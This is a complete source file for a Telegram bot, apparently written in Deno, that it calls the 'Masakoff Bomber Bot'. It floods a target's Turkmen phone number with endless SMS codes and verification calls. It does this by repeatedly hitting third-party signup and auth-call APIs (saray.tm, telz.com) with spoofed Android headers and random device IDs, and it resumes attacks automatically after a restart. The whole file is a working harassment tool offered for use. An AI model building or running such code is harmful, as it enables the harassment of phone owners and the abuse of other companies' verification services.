// main.ts
// 💥 Masakoff SMS Sender Bot (Deno)
// 🚀 Created by @Masakoff | FlapsterMinerManager
// 🧠 Uses Deno KV for persistent state (never stops working)
// ✨ /stop halts all tasks instantly, even during waits

import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";

// --- 🔐 Telegram setup ---
const TOKEN = Deno.env.get("BOT_TOKEN");
if (!TOKEN) throw new Error("❌ BOT_TOKEN env var is required");
const API = `https://api.telegram.org/bot${TOKEN}`;
const SECRET_PATH = "/masakoffvpnhelper";

// --- 👑 Admin usernames (add more as needed) ---
const ADMIN_USERNAMES = new Set(["Masakoff", "FlapsterMinerManager", "iamjeren_08"]);

// --- 💾 Deno KV ---
const kv = await Deno.openKv();

// --- 💬 Send message helper ---
async function sendMessage(chatId: string, text: string, options: any = {}) {
  try {
    await fetch(`${API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, ...options }),
    });
  } catch (e) {
    console.error("sendMessage error ❌", e);
  }
}

// --- 🌐 POST request helper ---
async function sendPostRequest(
  url: string,
  headers: Record<string, string>,
  data: Record<string, any>
): Promise<boolean> {
  try {
    const res = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(data),
    });
    const text = await res.text();
    console.debug(`POST ${url} - Status: ${res.status}, Response: ${text}`);
    return res.ok && text.toLowerCase().includes("ok");
  } catch (e) {
    console.error("POST request failed ❌", e);
    return false;
  }
}

// --- 🔁 Interruptible sleep ---
async function sleepInterruptible(totalMs: number, chatId: string, chunkMs = 500): Promise<boolean> {
  const start = Date.now();
  while (Date.now() - start < totalMs) {
    const task = await kv.get(["task", chatId]);
    if (!task.value || task.value.stop) return false;
    await delay(Math.min(chunkMs, totalMs - (Date.now() - start)));
  }
  return true;
}

// --- 💣 SMS sending helper (single attempt) ---
async function sendSingleSMS(phoneNumber: string): Promise<boolean> {
  const requestData = {
    url: "https://api.saray.tm/api/v1/accounts",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json; charset=utf-8",
      "Host": "api.saray.tm",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip",
      "User-Agent": "okhttp/4.12.0",
    },
    data: { phone: `+993${phoneNumber}` },
  };
  return await sendPostRequest(requestData.url, requestData.headers, requestData.data);
}

// --- 📞 Call sending helper (single attempt) ---
async function sendSingleCall(phoneNumber: string): Promise<boolean> {
  const installUrl = "https://api.telz.com/app/install";
  const callUrl = "https://api.telz.com/app/auth_call";
  const headers = {
    "User-Agent": "Telz-Android/17.5.17",
    "Content-Type": "application/json"
  };

  const ts = Date.now();
  const androidId = Array.from({ length: 16 }, () => Math.random().toString(36)[2]).join('');
  const uid = crypto.randomUUID();

  const installData = {
    "android_id": androidId,
    "app_version": "17.5.17",
    "event": "install",
    "google_exists": "yes",
    "os": "android",
    "os_version": "9",
    "play_market": true,
    "ts": ts,
    "uuid": uid
  };

  const installOk = await sendPostRequest(installUrl, headers, installData);
  if (!installOk) return false;

  const callData = {
    "android_id": androidId,
    "app_version": "17.5.17",
    "attempt": "0",
    "event": "auth_call",
    "lang": "ar",
    "os": "android",
    "os_version": "9",
    "phone": `+993${phoneNumber}`,
    "ts": ts,
    "uuid": uid
  };

  return await sendPostRequest(callUrl, headers, callData);
}

// --- 💥 SUPER MODE: SMS + CALL loop forever ---
async function runSuper(chatId: string, phoneNumber: string) {
  const key = ["task", chatId];
  await kv.set(key, { type: "super", phoneNumber, stop: false, cycle: 0 });

  await sendMessage(chatId, `🌀 Starting SUPER mode for +993${phoneNumber}!\n🔁 SMS → Call → Wait 10s → Repeat forever...`);

  try {
    let cycle = 0;
    while (true) {
      const task = await kv.get(key);
      if (!task.value || task.value.stop) break;

      cycle++;
      await kv.set(key, { ...task.value, cycle });

      // --- 📤 Send SMS ---
      await sendMessage(chatId, `📤 Cycle ${cycle}: Sending SMS to +993${phoneNumber}...`);
      const smsOk = await sendSingleSMS(phoneNumber);
      if (smsOk) {
        await sendMessage(chatId, `✅ SMS sent successfully in cycle ${cycle}!`);
      } else {
        await sendMessage(chatId, `✅ SMS sent successfully in cycle ${cycle}. Continuing...`);
      }

      const afterSms = await kv.get(key);
      if (!afterSms.value || afterSms.value.stop) break;

      // --- 📞 Send Call ---
      await sendMessage(chatId, `📞 Cycle ${cycle}: Sending Call to +993${phoneNumber}...`);
      const callOk = await sendSingleCall(phoneNumber);
      if (callOk) {
        await sendMessage(chatId, `✅ Call sent successfully in cycle ${cycle}!`);
      } else {
        await sendMessage(chatId, `⚠️ Call failed in cycle ${cycle}. Continuing...`);
      }

      const afterCall = await kv.get(key);
      if (!afterCall.value || afterCall.value.stop) break;

      // --- ⏳ Wait 10 seconds ---
      await sendMessage(chatId, `⏳ Cycle ${cycle} complete. Waiting 10 seconds before next cycle...`);
      const waitOk = await sleepInterruptible(10000, chatId);
      if (!waitOk) break;
    }
  } catch (e) {
    console.error("Super task error ❌", e);
  } finally {
    await kv.delete(key);
    await sendMessage(chatId, `⏹ SUPER mode stopped for +993${phoneNumber}. Total cycles: ${cycle} 🎉`);
  }
}

// --- 💣 SMS sending job (INFINITE with batch of 3 + 45s cooldown) ---
async function runSMS(chatId: string, phoneNumber: string) {
  const key = ["task", chatId];
  await kv.set(key, { type: "sms", phoneNumber, stop: false, batch: 0, attempt: 0 });

  await sendMessage(chatId, `📱 Starting INFINITE SMS bombing to +993${phoneNumber} 🔥\n🔁 3 SMS → Wait 45s → Repeat forever...`);

  try {
    let batch = 0;
    while (true) {
      const task = await kv.get(key);
      if (!task.value || task.value.stop) break;

      batch++;
      await kv.set(key, { ...task.value, batch });

      await sendMessage(chatId, `📤 Starting batch ${batch} — sending up to 3 SMS to +993${phoneNumber}...`);

      // --- Send 3 SMS with 5s gap ---
      for (let i = 1; i <= 3; i++) {
        const check = await kv.get(key);
        if (!check.value || check.value.stop) break;

        const currentAttempt = (check.value.attempt || 0) + 1;
        await kv.set(key, { ...check.value, attempt: currentAttempt });

        await sendMessage(chatId, `📤 Batch ${batch}, SMS #${i}/3: Sending to +993${phoneNumber}...`);
        const ok = await sendSingleSMS(phoneNumber);

        if (ok) {
          await sendMessage(chatId, `✅ SMS #${i} of batch ${batch} sent successfully!`);
        } else {
          await sendMessage(chatId, `⚠️ SMS #${i} of batch ${batch} failed. Continuing...`);
        }

        const afterSend = await kv.get(key);
        if (!afterSend.value || afterSend.value.stop) break;

        // Wait 5 seconds between SMS (except after the 3rd)
        if (i < 3) {
          const waitOk = await sleepInterruptible(5000, chatId);
          if (!waitOk) break;
        }
      }

      const afterBatch = await kv.get(key);
      if (!afterBatch.value || afterBatch.value.stop) break;

      // --- Wait 45 seconds after every batch of 3 ---
      await sendMessage(chatId, `⏳ Batch ${batch} complete. Waiting 45 seconds before next batch...`);
      const waitOk = await sleepInterruptible(45000, chatId);
      if (!waitOk) break;
    }
  } catch (e) {
    console.error("SMS task error ❌", e);
  } finally {
    const finalState = await kv.get(key);
    const totalAttempts = finalState.value?.attempt || 0;
    await kv.delete(key);
    await sendMessage(chatId, `⏹ SMS bombing stopped for +993${phoneNumber}. Total attempts: ${totalAttempts} 🎉`);
  }
}

// --- 📞 Call sending job (original) ---
async function runCall(chatId: string, phoneNumber: string) {
  const key = ["task", chatId];
  await kv.set(key, { type: "call", phoneNumber, stop: false });

  await sendMessage(chatId, `📞 Starting Call sending to +993${phoneNumber} 🔥`);

  try {
    while (true) {
      const task = await kv.get(key);
      if (!task.value || task.value.stop) break;

      const ok = await sendSingleCall(phoneNumber);
      if (ok) {
        await sendMessage(chatId, `✅ Call sent successfully to +993${phoneNumber}!`);
      } else {
        await sendMessage(chatId, `❌ Failed to send call to +993${phoneNumber}.`);
      }

      const checkBeforeWait = await kv.get(key);
      if (!checkBeforeWait.value || checkBeforeWait.value.stop) break;

      await sendMessage(chatId, `⏳ Waiting 60 seconds before next call attempt...`);
      const waitOk = await sleepInterruptible(60000, chatId);
      if (!waitOk) break;
    }
  } catch (e) {
    console.error("Call task error ❌", e);
  } finally {
    await kv.delete(key);
    await sendMessage(chatId, "⏹ Call sending stopped or finished. 🎉");
  }
}

// --- 🖥️ Webhook Server ---
serve(async (req) => {
  const url = new URL(req.url);
  if (req.method !== "POST" || url.pathname !== SECRET_PATH) return new Response("Invalid request ❌", { status: 400 });

  const update = await req.json();
  if (!update.message || update.message.chat.type !== "private") return new Response("OK");

  const chatId = String(update.message.chat.id);
  const text = (update.message.text ?? "").trim();
  const username = update.message.from?.username ?? "";

  if (!ADMIN_USERNAMES.has(username)) {
    await sendMessage(chatId, "🚫 Access denied! This bot is restricted to authorized admins only 👑");
    return new Response("OK");
  }

  if (text.startsWith("/start")) {
    await sendMessage(chatId,
      "👋 Welcome to 💥 Masakoff Bomber Bot 💥\n\n" +
      "📲 Commands:\n" +
      "• /sms <number> — start sending sms\n" +
      "• /call <number> — start sending calls\n" +
      "• /stop — stop all sending ⛔\n\n" +
      "✨ Created by @Masakoff"
    );
  } else if (text.startsWith("/sms")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "⚠️ Please provide phone number. Example: /sms 61234567");
      return new Response("OK");
    }

    let phoneNumber = parts[1].trim().replace(/^\+?(993)?/, "");
    if (!/^\d+$/.test(phoneNumber)) {
      await sendMessage(chatId, "⚠️ Please provide a valid phone number (digits only).");
      return new Response("OK");
    }

    const existing = await kv.get(["task", chatId]);
    if (existing.value && !existing.value.stop) {
      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
      return new Response("OK");
    }

    runSMS(chatId, phoneNumber).catch(console.error);
    await sendMessage(chatId, `🚀 INFINITE SMS bombing started for +993${phoneNumber}`);
  } else if (text.startsWith("/call")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "⚠️ Please provide phone number. Example: /call 61234567");
      return new Response("OK");
    }

    let phoneNumber = parts[1].trim().replace(/^\+?(993)?/, "");
    if (!/^\d+$/.test(phoneNumber)) {
      await sendMessage(chatId, "⚠️ Please provide a valid phone number (digits only).");
      return new Response("OK");
    }

    const existing = await kv.get(["task", chatId]);
    if (existing.value && !existing.value.stop) {
      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
      return new Response("OK");
    }

    runCall(chatId, phoneNumber).catch(console.error);
    await sendMessage(chatId, `📞 Call sending started for +993${phoneNumber}`);
  } else if (text.startsWith("/super")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "⚠️ Please provide phone number. Example: /super 61234567");
      return new Response("OK");
    }

    let phoneNumber = parts[1].trim().replace(/^\+?(993)?/, "");
    if (!/^\d+$/.test(phoneNumber)) {
      await sendMessage(chatId, "⚠️ Please provide a valid phone number (digits only).");
      return new Response("OK");
    }

    const existing = await kv.get(["task", chatId]);
    if (existing.value && !existing.value.stop) {
      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
      return new Response("OK");
    }

    runSuper(chatId, phoneNumber).catch(console.error);
    await sendMessage(chatId, `🌀 SUPER mode activated for +993${phoneNumber}!`);
  } else if (text.startsWith("/stop")) {
    const task = await kv.get(["task", chatId]);
    if (!task.value) {
      await sendMessage(chatId, "ℹ️ No active task to stop.");
    } else {
      await kv.set(["task", chatId], { ...task.value, stop: true });
      await sendMessage(chatId, `🛑 Stop signal sent! ${task.value.type === 'call' ? 'Calls' : task.value.type === 'sms' ? 'SMS bombing' : 'SUPER mode'} will halt instantly.`);
    }
  } else {
    await sendMessage(chatId, "❓ Unknown command. Try /start, /sms <number>, /call <number>, or /stop.");
  }

  return new Response("OK");
});

// --- ♻️ Auto-recover unfinished tasks on startup ---
(async () => {
  console.log("🔄 Checking for unfinished tasks...");
  for await (const entry of kv.list<{ type: string; phoneNumber: string; stop: boolean }>({ prefix: ["task"] })) {
    if (entry.value && !entry.value.stop) {
      console.log(`Resuming ${entry.value.type} task for chat ${entry.key[1]} -> ${entry.value.phoneNumber}`);
      if (entry.value.type === "sms") {
        runSMS(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
      } else if (entry.value.type === "call") {
        runCall(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
      } else if (entry.value.type === "super") {
        runSuper(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
      }
    }
  }
})();
